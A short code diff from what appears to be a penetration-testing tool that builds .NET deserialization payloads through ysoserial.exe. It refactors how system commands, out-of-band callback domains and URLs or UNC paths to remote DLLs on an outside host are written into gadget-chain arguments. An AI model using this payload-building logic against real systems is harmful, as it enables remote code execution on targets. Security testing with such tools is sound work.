@@ -303,12 +303,11 @@ class YSOSerialNet(Serializer):
                         logging.error(f"[{chain['name']}] Cannot generate payload because the gadget requires a payload bin file to be generated first. By lazyness, the tool used the first generated one. You must use ysoserial.exe directly for that.")
                         continue
 
-
                     logging.info(f"[{chain['name']}] Generating payload with formatter '{formatter}'")
 
                     chain_system_command = system_command
                     chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
-                    chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
+                    chain_system_command = chain_system_command.replace('%%domain%%', str(self.chainOpts.interact_domain))
                     escaped_chain_system_command = chain_system_command.replace('"', '\\"')
                     chain_system_command = chain_system_command.replace("'", "\\'")
                     
@@ -322,9 +321,9 @@ class YSOSerialNet(Serializer):
                     chainArguments = chainArguments.replace('<gadget>', gadget)
                     chainArguments = chainArguments.replace('<local_file>', os.path.basename(fp.name)+";"+csharp_code_dlls)
                     chainArguments = chainArguments.replace('<system_command>', chain_system_command)
-                    chainArguments = chainArguments.replace('<domain>', str(interact_domain))
-                    chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.dll")
-                    chainArguments = chainArguments.replace('<unc>', f"\\\\{interact_domain}\\share\\{chain['id']}.dll".replace('\\', '\\\\'))
+                    chainArguments = chainArguments.replace('<domain>', f"{chain['id']}.{interact_domain}")
+                    chainArguments = chainArguments.replace('<url>', f"https://{chain['id']}.{interact_domain}/{chain['id']}.dll")
+                    chainArguments = chainArguments.replace('<unc>', f"\\\\{chain['id']}.{interact_domain}\\share\\{chain['id']}.dll".replace('\\', '\\\\'))
                     chainArguments = chainArguments.replace('<net_remoting_url>', csharp_net_remoting.replace('%%chain_id%%', chain['id']))
                     chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
                     chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'dll'))
